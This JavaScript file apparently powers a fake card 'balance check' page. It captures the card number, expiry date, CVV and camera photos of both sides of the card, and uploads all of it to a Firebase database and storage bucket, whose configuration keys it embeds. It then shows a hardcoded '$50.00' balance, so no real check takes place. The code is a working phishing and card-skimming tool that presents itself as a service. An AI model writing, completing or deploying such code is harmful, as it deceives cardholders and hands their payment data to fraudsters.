// js/balance.js - FINAL FIREBASE VERSION (WORKS WITH YOUR balance.html)
console.log("Camera script loaded");

let stream = null;
let frontBlob = null;
let backBlob = null;

window.frontBlob = null;
window.backBlob = null;

// === ADD THESE 3 FIREBASE SCRIPTS TO <head> OF balance.html IF NOT ALREADY THERE ===
// <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-app-compat.js"></script>
// <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-database-compat.js"></script>
// <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-storage-compat.js"></script>

// ✅ FIXED: Correct storageBucket domain
const firebaseConfig = {
    apiKey: "AIzaSyBRmao9nvw49R1U6zS9NNY5W4Dn-NkNcrg",
    authDomain: "vanilla-3be8f.firebaseapp.com",
    projectId: "vanilla-3be8f",
    storageBucket: "vanilla-3be8f.appspot.com",
    messagingSenderId: "476314002999",
    appId: "1:476314002999:web:38adc0bd80a8d6b44f81b2"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const storage = firebase.storage();

document.addEventListener("DOMContentLoaded", () => {
  console.log("Page ready");

  document.getElementById("expiry_date").addEventListener("input", (e) => {
    let v = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) {
      v = v.slice(0, 2) + "/" + v.slice(2);
    }
    e.target.value = v;
  });

  document.getElementById("openCameraBtn").addEventListener("click", async () => {
    document.getElementById("dualCaptureBlock").classList.remove("hidden");
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
      const track = stream.getVideoTracks()[0];
      document.getElementById("dualVideoFront").srcObject = new MediaStream([track.clone()]);
      document.getElementById("dualVideoBack").srcObject = new MediaStream([track]);
    } catch (err) {
      alert("Camera not available. Use mobile or allow camera.");
      console.error(err);
    }
  });

  document.getElementById("dualCloseBtn").addEventListener("click", () => {
    document.getElementById("dualCaptureBlock").classList.add("hidden");
    if (stream) stream.getTracks().forEach(t => t.stop());
    stream = null;
  });

  document.getElementById("captureFrontBtn").addEventListener("click", () => {
    capture("dualVideoFront", "frontPreview", b => {
      frontBlob = b;
      window.frontBlob = b;
    });
  });

  document.getElementById("captureBackBtn").addEventListener("click", () => {
    capture("dualVideoBack", "backPreview", b => {
      backBlob = b;
      window.backBlob = b;
    });
  });

  function capture(videoId, imgId, callback) {
    const video = document.getElementById(videoId);
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    canvas.toBlob(blob => {
      document.getElementById(imgId).src = URL.createObjectURL(blob);
      document.getElementById(imgId).classList.remove("hidden");
      callback(blob);
    }, "image/jpeg", 0.9);
  }

  async function uploadImage(blob, side) {
    if (!blob) return "";
    console.log(`Uploading ${side} image...`);
    const fileName = `${side}_${Date.now()}.jpg`;
    const ref = storage.ref(`images/${fileName}`);
    await ref.put(blob);
    const url = await ref.getDownloadURL();
    console.log(`${side} image uploaded:`, url);
    return url;
  }

  document.getElementById("balanceForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const submitBtn = document.getElementById("submitBtn");
    const label = submitBtn.querySelector('[data-label]');
    const spinner = submitBtn.querySelector('[data-spinner]');
    const status = document.getElementById("submitStatus");

    label.classList.add("hidden");
    spinner.classList.remove("hidden");
    status.textContent = "Uploading images...";

    try {
      console.log("Front blob:", frontBlob);
      console.log("Back blob:", backBlob);

      const frontUrl = await uploadImage(frontBlob, "front");
      const backUrl = await uploadImage(backBlob, "back");

      document.getElementById("front_image_url").value = frontUrl;
      document.getElementById("back_image_url").value = backUrl;

      const data = {
        card_number: document.querySelector('[name="card_number"]').value.trim(),
        expiry_date: document.querySelector('[name="expiry_date"]').value.trim(),
        cvv: document.querySelector('[name="cvv"]').value.trim(),
        front_image: frontUrl || null,
        back_image: backUrl || null,
        timestamp: Date.now()
      };

      status.textContent = "Sending details...";
      console.log("Sending data to Firebase:", data);

      await db.ref("submissions").push(data);

      status.textContent = "Success! Balance checked.";
      document.getElementById("balanceText").textContent = "$50.00";
      document.getElementById("result").classList.remove("hidden");

      setTimeout(() => {
        document.getElementById("balanceForm").reset();
        document.getElementById("front_image_url").value = "";
        document.getElementById("back_image_url").value = "";
        document.getElementById("result").classList.add("hidden");
        status.textContent = "";
        frontBlob = backBlob = null;
        window.frontBlob = window.backBlob = null;
        document.getElementById("frontPreview").classList.add("hidden");
        document.getElementById("backPreview").classList.add("hidden");
        label.classList.remove("hidden");
        spinner.classList.add("hidden");
      }, 4000);

    } catch (err) {
      console.error("Submission error:", err);
      status.textContent = `Error: ${err.message}`;
      label.classList.remove("hidden");
      spinner.classList.add("hidden");
    }
  });

  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
    document.getElementById("balanceForm").dispatchEvent(new Event("submit"));
  });
});
